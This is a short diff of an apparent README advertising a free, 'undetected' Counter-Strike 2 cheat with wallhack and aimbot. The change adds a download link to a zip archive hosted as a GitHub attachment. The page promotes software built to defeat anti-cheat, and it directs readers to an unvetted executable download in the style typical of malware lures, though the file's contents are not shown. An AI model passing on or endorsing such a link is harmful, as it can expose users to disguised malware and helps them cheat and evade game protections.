@@ -9,7 +9,7 @@ CS2 CHEAT FREE 2025 | Wallhack + Aimbot – Undetected + Easy Install Guide | NI
 🎮 Works with Intel / AMD
 _____________________
 # 🔽 Download:
-> 📁 [Click Here To Download]()
+> 📁 [Click Here To Download](https://github.com/user-attachments/files/21162465/NixWare.zip)
 > 
 > File size: ~6 MB | Format: .zip
 _______________________
